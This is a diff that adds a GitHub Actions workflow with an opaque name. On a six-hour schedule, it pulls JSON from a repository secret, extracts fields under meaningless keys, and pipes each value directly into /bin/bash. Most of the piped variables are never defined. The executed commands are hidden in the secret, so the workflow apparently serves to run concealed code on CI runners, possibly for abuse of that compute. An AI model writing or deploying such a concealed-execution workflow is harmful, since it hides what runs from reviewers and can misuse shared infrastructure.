@@ -1,0 +1,24 @@
+name: caocao19870104
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '18 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: caocao19870104
+        env:
+          n93: ${{ secrets.n93 }}
+        run: |
+          echo $n93 | jq -r .irdd797 | /bin/bash
+          echo $va13 | jq -r .pnqc4 | /bin/bash
+          echo $iank7 | jq -r .bmnc46 | /bin/bash
+          echo $xggi87 | jq -r .k1316 | /bin/bash
+          echo $q893 | jq -r .r03 | /bin/bash
+          echo $rn4872 | jq -r .w7 | /bin/bash
+          echo $h98 | jq -r .mjmow13953 | /bin/bash
+          echo $aewmn05 | jq -r .jdre8 | /bin/bash
+          echo $dh51246 | jq -r .a3 | /bin/bash
+
